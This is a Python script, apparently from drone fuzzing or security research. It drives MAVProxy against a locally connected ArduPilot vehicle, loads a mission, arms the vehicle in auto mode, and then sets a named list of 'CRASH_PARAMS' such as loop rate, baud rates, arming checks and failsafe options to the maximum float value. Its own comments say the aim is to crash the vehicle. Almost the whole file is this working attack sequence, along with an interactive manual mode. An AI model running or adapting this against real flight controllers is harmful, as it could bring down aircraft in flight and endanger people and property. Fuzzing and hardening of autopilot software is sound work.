import os
import sys
import pty
import subprocess
import time
from pymavlink import mavutil
import numpy

limits = numpy.finfo(numpy.float32)
MAX_FLOAT = limits.max
MIN_FLOAT = limits.min

CRASH_PARAMS = [
        "SCHED_LOOP_RATE",

        "SERIAL0_BAUD",
        "SERIAL1_BAUD",
        "SERIAL2_BAUD",
        "SERIAL3_BAUD",
        "SERIAL4_BAUD",
        "SERIAL5_BAUD",

        "STAT_FLTTIME",
        "ARMING_MIS_ITEMS",
        "TELEM_DELAY",
        "LOG_BITMASK",
        "STAT_RUNTIME",
        "STAT_RESET",
        "ARMING_CHECK",
        "FS_OPTIONS",
        "AHRS_TRIM_X"
    ]

MAVPROXY_CMD = [
    "mavproxy.py",
    "--master=udpout:127.0.0.1:14551",
    "--out=udpout:127.0.0.1:14552",
    "--map",
    "--console",
]

def param_set(mav, name: str, value: float, param_type=mavutil.mavlink.MAV_PARAM_TYPE_REAL32):
    mav.mav.param_set_send(
        mav.target_system,
        mav.target_component,
        name.encode("ascii"),
        value,
        param_type
    )
    print("param set complete")

def cleanup(master_fd, proc):
    proc.terminate()
    proc.wait()
    os.close(master_fd)

# Read from the master fd until the specified key is found or timeout occurs
def read_until(master_fd, proc, key, timeout=sys.maxsize):

    start_time = time.perf_counter()
    timeout_time = start_time + timeout

    try:

        while True:

            if time.perf_counter() > timeout_time:
                print("Timeout waiting for key:", key)
                break

            try:
                data = os.read(master_fd, 1024)
                if not data:
                    break
                line = data.decode(errors="ignore")
                print(line, end="")
                if key in line:
                    print("Found key:", key)
                    break

            except OSError:
                break

    except KeyboardInterrupt:
        print("Exiting before parameters set...")
        cleanup(master_fd, proc)
        sys.exit(0)

def send(master_fd, cmd):
    os.write(master_fd, (cmd + "\n").encode())

# For using this script outside of fuzzing
def manual_mode(master_fd):

    print("C2 MANUAL MODE")

    time.sleep(60)
    print("Waking up...")

    mav = mavutil.mavlink_connection("udp:127.0.0.1:14552")
    mav.wait_heartbeat()

    for param in CRASH_PARAMS:
        if param == "AHRS_TRIM_X":
            param_set(mav, param, MAX_FLOAT)
            time.sleep(0.5)

    try:
        while True:
            command = input("MAVProxy> ")
            send(master_fd, command)
            read_until(master_fd, None, "", timeout=0.5)
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass

    # mav = mavutil.mavlink_connection("udp:127.0.0.1:14552")
    # mav.wait_heartbeat()

    # while True:
    #     param_name = input("enter param name: ")
    #     command = input("enter value: ")

    #     raw = float(command)
    #     param_set(mav, param_name, raw)

    #     time.sleep(0.1)

    #     try:
    #         data = os.read(master_fd, 1024)
    #         if data:
    #             print(data.decode(errors="ignore"), end="")
    #     except BlockingIOError:
    #         pass

def main():

    if len(sys.argv) < 2:
        print("Usage: python3 mav_command_and_control.py /path/to/init/params.txt [/path/to/mission.txt/] [/path/to/new/params.txt]")
        exit(1)
    
    param_file_path = sys.argv[1]
    if not os.path.isfile(param_file_path):
        print(f"Parameter file {param_file_path} does not exist.")
        exit(1)

    if len(sys.argv) > 2:

        mission_file_path = sys.argv[2]
        if not os.path.isfile(mission_file_path):
            print(f"Mission file {mission_file_path} does not exist.")
            exit(1)

        set_param_file_path = sys.argv[3]
        if not os.path.isfile(set_param_file_path):
            print(f"Set parameter file {set_param_file_path} does not exist.")
            exit(1)
    
    master_fd, slave_fd = pty.openpty()

    proc = subprocess.Popen(
        MAVPROXY_CMD,
        stdin=slave_fd,
        stdout=slave_fd,
        stderr=slave_fd,
        close_fds=True,
    )

    os.close(slave_fd)

    # Allow startup
    time.sleep(0.5)

    mav = mavutil.mavlink_connection("udp:127.0.0.1:14552")
    mav.wait_heartbeat()

    print("Connected")

    # while True:
    #     msg = mav.recv_match(type='STATUSTEXT', blocking=True)
    #     if msg:
    #         text = msg.text
    #         severity = msg.severity
    #         print(f"STATUSTEXT[{severity}]: {text}")

    # Wait for initialization
    read_until(master_fd, proc, "Received")

    # Load initial parameters
    send(master_fd, f"param load {param_file_path}")
    read_until(master_fd, proc, f"parameters from {param_file_path}")

    if len(sys.argv) > 2:

        print("C2 AUTO MODE")

        send(master_fd, f"param load {set_param_file_path}")
        time.sleep(60) # Wait a long time for EKF to be healthy again

        send(master_fd, f"wp load {mission_file_path}")
        read_until(master_fd, proc, f"waypoints in")
        time.sleep(3)

        send(master_fd, "mode auto")
        # read_until(master_fd, proc, "waypoint 1")
        time.sleep(3)

        send(master_fd, "arm throttle")
        # read_until(master_fd, proc, "Throttle armed")
        time.sleep(20)

        # Just bomb that bih
        mav = mavutil.mavlink_connection("udp:127.0.0.1:14552")
        mav.wait_heartbeat()
        # param_set(mav, "FS_OPTIONS", MAX_FLOAT)
        for param in CRASH_PARAMS:
            param_set(mav, param, MAX_FLOAT)
            time.sleep(0.5)

        # Reading mavlink messages
        print("Reading MAVLink messages...")
        while True:
            mav_msg = mav.recv_match(blocking=True)
            if mav_msg:
                if mav_msg.get_type() == "PARAM_VALUE":
                    print(mav_msg)

                    
                # print(f"Message type: {mav_msg.get_type()}")
                # print(f"Message field names: {mav_msg.get_fieldnames()}")
                # print(mav_msg)

        # try:
        #     while True:
        #         # time.sleep(1)
        #         read_until(master_fd, proc, "",)
        # except KeyboardInterrupt:
        #     pass

    else:
        manual_mode(master_fd)

    print("Terminating MAVProxy...")
    cleanup(master_fd, proc)

if __name__ == "__main__":
    main()